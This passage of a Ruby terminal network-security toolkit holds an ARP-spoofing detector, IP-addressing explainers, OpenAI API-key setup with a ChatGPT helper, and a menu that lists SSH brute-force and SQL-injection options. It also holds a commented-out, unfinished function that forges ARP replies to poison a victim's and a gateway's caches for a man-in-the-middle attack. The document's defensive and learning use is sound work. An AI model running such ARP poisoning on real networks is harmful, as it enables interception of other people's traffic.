    puts "\n#{BRIGHT_YELLOW}Recommendation:#{RESET} Perform additional scans to confirm these results or investigate the devices manually."
  end
end

# Enhanced function to detect ARP spoofing (#17)
def detect_arp_spoofing
  puts "#{BRIGHT_GREEN}=== Detecting ARP Spoofing ===#{RESET}"

  # Check if there is enough historical data to compare
  if $arp_scan_history.size < 3 # Require at least three scans for a more robust analysis
    puts "#{BRIGHT_RED}Not enough historical ARP data available. Please run ARP scanning multiple times for more accurate analysis.#{RESET}"
    return
  end

  spoofing_detected = false
  mac_change_count = Hash.new(0) # Track how many times each IP's MAC address has changed
  ip_change_details = Hash.new { |hash, key| hash[key] = [] } # Track the history of MAC addresses for each IP

  # Analyze data from the last three scans
  puts "\n#{BRIGHT_YELLOW}Analyzing the last three ARP scans for inconsistencies...#{RESET}"
  latest_scan = parse_arp_entries($arp_scan_history[-1].join("\n"))
  previous_scans = $arp_scan_history[-3..-2].map { |scan| parse_arp_entries(scan.join("\n")) }

  # Display the data being analyzed for transparency
  puts "#{BRIGHT_CYAN}\nComparing data from the last three scans:#{RESET}"
  $arp_scan_history.last(3).each_with_index do |scan_data, index|
    puts "\n#{BRIGHT_GREEN}Scan #{index + 1} data:#{RESET}"
    puts scan_data.join("\n")
  end

  # Cross-check the latest scan with the previous two scans
  latest_scan.each do |current_entry|
    ip = current_entry[:ip]
    current_mac = current_entry[:mac]

    # Track MAC address history across the previous scans
    previous_scans.each_with_index do |prev_scan, index|
      prev_entry = prev_scan.find { |e| e[:ip] == ip }
      if prev_entry
        prev_mac = prev_entry[:mac]
        ip_change_details[ip] << prev_mac

        if prev_mac != current_mac
          puts "#{BRIGHT_RED}Potential MAC address change detected: IP #{ip} changed from #{prev_mac} to #{current_mac} in Scan #{index + 1}.#{RESET}"
          mac_change_count[ip] += 1
          spoofing_detected = true
        end
      else
        puts "#{BRIGHT_YELLOW}New IP detected in the latest scan: #{ip} with MAC #{current_mac}.#{RESET}"
      end
    end

    # Include the current MAC in the history tracking
    ip_change_details[ip] << current_mac
  end

  # Perform frequency analysis to identify potentially suspicious IPs
  perform_frequency_analysis(mac_change_count, ip_change_details)
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to explain static and dynamic IP addresses (#19)
def explain_static_dynamic_ips
  puts "#{BRIGHT_GREEN}=== Static vs Dynamic IP Addresses ===#{RESET}"
  puts "#{BRIGHT_YELLOW}1. Static IP Address:#{RESET}"
  puts "   A static IP address is a fixed address that doesn't change over time. It is assigned manually by an administrator."
  puts "   Used often by servers or devices that need a permanent address (e.g., web servers)."
  puts "#{BRIGHT_YELLOW}2. Dynamic IP Address:#{RESET}"
  puts "   A dynamic IP address is assigned automatically by a DHCP server and can change over time."
  puts "   It's commonly used by residential users, where IP addresses are reassigned after a lease period."
  
  puts "\n#{BRIGHT_CYAN}Cybersecurity Impact:#{RESET}"
  puts "   - Static IP addresses are easier to track and target, but they're essential for services needing stability."
  puts "   - Dynamic IP addresses offer more privacy and security for casual users, as they change frequently."
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to provide more information about static and dynamic IP addresses (#20)
def learn_more_about_ips
  puts "#{BRIGHT_GREEN}=== Learn More About IP Address Types ===#{RESET}"
  puts "#{BRIGHT_YELLOW}Here are a few ways to learn more about static and dynamic IP addresses:#{RESET}"
  
  # Provide ideas for further exploration
  puts "1. Research DHCP (Dynamic Host Configuration Protocol): Learn how dynamic IPs are assigned and managed in networks."
  puts "2. Investigate DNS services and how static IPs are used for hosting websites and services."
  puts "3. Explore your own network's DHCP lease times and how often your dynamic IP changes."
  puts "4. Use network tools like 'ipconfig' (Windows) or 'ifconfig' (Linux) to examine your local IP settings."
  puts "5. Check your router settings to see how IP addresses are managed on your network."
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to Automate API Setup #23
def automated_api_setup
  puts "#{BRIGHT_GREEN}=== Automated API Setup ===#{RESET}"
  puts "This tool will help you set up the API for the ChatGPT Assistant feature."

  # Step 1: Get the API key from the user
  print "#{BRIGHT_YELLOW}Enter your OpenAI API Key: #{RESET}"
  api_key = gets.chomp.strip

  if api_key.empty?
    puts "#{BRIGHT_RED}API key cannot be empty. Setup aborted.#{RESET}"
    return
  end

  # Step 2: Save the API key to a file for local use
  config_file = "config.json"
  begin
    config_data = { "OPENAI_API_KEY" => api_key }
    File.open(config_file, "w") do |f|
      f.write(JSON.pretty_generate(config_data))
    end
    puts "#{BRIGHT_GREEN}API key saved successfully in #{config_file}.#{RESET}"
  rescue => e
    puts "#{BRIGHT_RED}Failed to save API key: #{e.message}#{RESET}"
    return
  end

  # Step 3: Validate the API key by making a test request
  puts "#{BRIGHT_YELLOW}Validating your API key...#{RESET}"
  begin
    response = validate_openai_api_key(api_key)
    if response
      puts "#{BRIGHT_GREEN}API key validation successful! The AI assistant is ready to use.#{RESET}"
    else
      puts "#{BRIGHT_RED}API key validation failed. Please ensure the key is correct and try again.#{RESET}"
    end
  rescue => e
    puts "#{BRIGHT_RED}Validation failed due to an error: #{e.message}#{RESET}"
  end
end

# Helper function to validate the OpenAI API key
def validate_openai_api_key(api_key)
  api_url = "https://api.openai.com/v1/chat/completions"
  headers = {
    "Content-Type" => "application/json",
    "Authorization" => "Bearer #{api_key}"
  }
  body = {
    model: "gpt-3.5-turbo",
    messages: [{ role: "user", content: "Test connection" }]
  }

  response = HTTParty.post(api_url, body: body.to_json, headers: headers, timeout: 10)
  response.code == 200
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to perform and run an AI support assistant #24
class ChatGPTService
  include HTTParty

  API_URL = 'https://api.openai.com/v1/chat/completions'

  def initialize(message, model = 'gpt-3.5-turbo')
    @api_key = ENV['OPENAI_API_KEY']
    raise 'OpenAI API key not found in environment variables' unless @api_key

    @message = message
    @model = model
  end

  def call
    response = HTTParty.post(
      API_URL,
      headers: headers,
      body: request_body.to_json
    )
    parse_response(response)
  rescue StandardError => e
    "Error: #{e.message}"
  end

  private

  def headers
    {
      'Content-Type' => 'application/json',
      'Authorization' => "Bearer #{@api_key}"
    }
  end

  def request_body
    {
      model: @model,
      messages: [{ role: 'user', content: @message }]
    }
  end

  def parse_response(response)
    if response.code == 200
      response_body = JSON.parse(response.body)
      response_body.dig('choices', 0, 'message', 'content') || 'No response generated'
    else
      "API Error: #{response['error']['message'] || response.message}"
    end
  end
end
# AI ASSISTANT FUNCTION PART #24
def chatgpt_assistant
  puts "#{BRIGHT_GREEN}=== ChatGPT AI Assistant ===#{RESET}"
  puts "Type 'stop' to exit the ChatGPT assistant and return to the main menu."
  loop do
    print "#{BRIGHT_YELLOW}Ask ChatGPT a question or request assistance: #{RESET}"
    user_input = gets.chomp.strip
    break if user_input.downcase == "stop"

    begin
      # Read API key from config.json
      config_file = "config.json"
      unless File.exist?(config_file)
        puts "#{BRIGHT_RED}API key not set up. Please run the API setup option first.#{RESET}"
        break
      end
      api_key = JSON.parse(File.read(config_file))["OPENAI_API_KEY"]

      # Call OpenAI API
      response = call_chatgpt_api(api_key, user_input)
      puts "#{BRIGHT_GREEN}ChatGPT's Response:#{RESET}"
      puts response
    rescue => e
      puts "#{BRIGHT_RED}Error: #{e.message}#{RESET}"
    end
  end
end

# Helper method to call OpenAI API
def call_chatgpt_api(api_key, message)
  api_url = "https://api.openai.com/v1/chat/completions"
  headers = {
    "Content-Type" => "application/json",
    "Authorization" => "Bearer #{api_key}"
  }
  body = {
    model: "gpt-3.5-turbo",
    messages: [{ role: "user", content: message }]
  }

  response = HTTParty.post(api_url, body: body.to_json, headers: headers, timeout: 10)
  if response.code != 200
    raise "API Error: #{response['error']['message']}"
  end

  response['choices'][0]['message']['content']
end
#----------------------------------------------------------------------------------------------------------------------------------------
# BACKGROUND FUNCTION FOR ERRORS/ERROR-HANDLING AND REPORTING MECHANISM (GLOBAL EXCEPTION HANDLER AND LOGGING SYSTEM)
def log_error(function_name, error, input_data = nil)
  timestamp = Time.now.iso8601
  file_name = "error_report_#{timestamp.gsub(':', '-')}.txt"
  
  File.open(file_name, "w") do |file|
    file.puts "=== ERROR REPORT ==="
    file.puts "Timestamp: #{timestamp}"
    file.puts "Function: #{function_name}"
    file.puts "Input Data: #{input_data.inspect}" if input_data
    file.puts "Error Message: #{error.message}"
    file.puts "Stack Trace:"
    file.puts error.backtrace.join("\n")
    file.puts "===================="
  end
  
  puts "#{BRIGHT_RED}An error occurred. Details have been saved in #{file_name}.#{RESET}"
end
#25
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to perform ARP spoofing for a Man-in-the-Middle attack (TO BE FINISHED AND DEVLEOPED, LEFT FOR SUGGESTIONS AND RECOMMENDATIONS)
#def mitm_attack(victim_ip, gateway_ip)
 # puts "#{BRIGHT_RED}=== Starting MITM Attack (ARP Spoofing) ===#{RESET}"
#  puts "#{BRIGHT_YELLOW}Warning: This operation can cause network disruptions and should only be used in a controlled environment with authorization.#{RESET}"

  # Get the MAC address of the local machine
#  local_mac = `ifconfig`.match(/ether\s+([\da-fA-F:]+)/)[1]
 # if local_mac.nil?
 #   puts "#{BRIGHT_RED}Failed to get the local MAC address. Aborting attack.#{RESET}"
 #   return
 # end

 # puts "#{BRIGHT_GREEN}Local MAC address: #{local_mac}#{RESET}"

  # ARP spoofing packets to poison victim and gateway
 # victim_arp_packet = PacketGen.gen('Eth', src: local_mac, dst: 'ff:ff:ff:ff:ff:ff')
  #                              .add('ARP', op: 'reply', sha: local_mac, spa: gateway_ip, tha: nil, tpa: victim_ip)

 # gateway_arp_packet = PacketGen.gen('Eth', src: local_mac, dst: 'ff:ff:ff:ff:ff:ff')
 #                                .add('ARP', op: 'reply', sha: local_mac, spa: victim_ip, tha: nil, tpa: gateway_ip)

  # Start the ARP spoofing attack
#  puts "#{BRIGHT_YELLOW}Poisoning ARP cache of victim (#{victim_ip}) and gateway (#{gateway_ip})...#{RESET}"
 # 10.times do
 #   PacketGen.send(victim_arp_packet)
 #   PacketGen.send(gateway_arp_packet)
 #   sleep(2) # Send ARP spoofing packets every 2 seconds
 # end

  #puts "#{BRIGHT_RED}ARP spoofing attack completed. The MITM setup is now active.#{RESET}"
 # puts "#{BRIGHT_YELLOW}Monitor traffic or use a tool like Wireshark to capture network data.#{RESET}"
#end

# Function to stop the MITM attack (restore the network)
#def restore_network(victim_ip, gateway_ip, victim_mac, gateway_mac)
 # puts "#{BRIGHT_GREEN}=== Restoring Network Configuration ===#{RESET}"
  # Construct ARP packets to restore the original MAC addresses
 # restore_victim = PacketGen.gen('Eth', src: gateway_mac, dst: 'ff:ff:ff:ff:ff:ff')
 #                           .add('ARP', op: 'reply', sha: gateway_mac, spa: gateway_ip, tha: victim_mac, tpa: victim_ip)

 # restore_gateway = PacketGen.gen('Eth', src: victim_mac, dst: 'ff:ff:ff:ff:ff:ff')
 #                            .add('ARP', op: 'reply', sha: victim_mac, spa: victim_ip, tha: gateway_mac, tpa: gateway_ip)

  # Send the ARP restore packets to fix the network configuration
#  5.times do
  #  PacketGen.send(restore_victim)
  #  PacketGen.send(restore_gateway)
  #  sleep(1) # Restore packets every second
 # end

 # puts "#{BRIGHT_GREEN}Network restored successfully.#{RESET}"
#end
#----------------------------------------------------------------------------------------------------------------------------------------
def run_tool
  loop do
    display_menu
    option = gets.chomp.to_i
  begin
    case option
    when 1
      display_network_configuration
    when 2
      ping_address
    when 3
      monitor_open_ports
    when 4
      scan_local_network
    when 5
      basic_vulnerability_check
    when 6
      draw_terminal_eye
    when 7 
      port_scanning_with_service_detection
    when 8
      ssh_brute_force
    when 9
      web_vulnerability_scanner
    when 10
      sql_injection_test
    when 11
      directory_bruteforcer # Placeholder for now
    when 12
      xss_scanner # Placeholder for now
    when 13
      https_analysis # Placeholder for now
    when 14
      graphical_analysis # Placeholder for now
    when 15
      automated_alerts # Placeholder for now
    when 16
      arp_scanning
    when 17
      detect_arp_spoofing
    when 18
      puts "#{BRIGHT_RED}Exiting the tool...#{RESET}"
      break
    when 19
      explain_static_dynamic_ips
    when 20
      learn_more_about_ips
    when 21
      # Perform MITM attack
      puts "#{BRIGHT_YELLOW}Enter victim's IP address: #{RESET}"
      victim_ip = gets.chomp
      puts "#{BRIGHT_YELLOW}Enter gateway's IP address: #{RESET}"
      gateway_ip = gets.chomp
      mitm_attack(victim_ip, gateway_ip)
    when 22
      # Restore network after MITM attack
      puts "#{BRIGHT_YELLOW}Enter victim's IP address: #{RESET}"
      victim_ip = gets.chomp
      puts "#{BRIGHT_YELLOW}Enter victim's MAC address: #{RESET}"
      victim_mac = gets.chomp
      puts "#{BRIGHT_YELLOW}Enter gateway's IP address: #{RESET}"
      gateway_ip = gets.chomp
      puts "#{BRIGHT_YELLOW}Enter gateway's MAC address: #{RESET}"
      gateway_mac = gets.chomp
      restore_network(victim_ip, gateway_ip, victim_mac, gateway_mac)
    when 23
      automated_api_setup
    when 24
      chatgpt_assistant
  else
    puts "#{BRIGHT_YELLOW}Option not yet implemented or invalid.#{RESET}"
  end
  rescue StandardError => e
    log_error("run_tool - Option #{option}", e)
  end
end
end
# Start the tool
run_tool
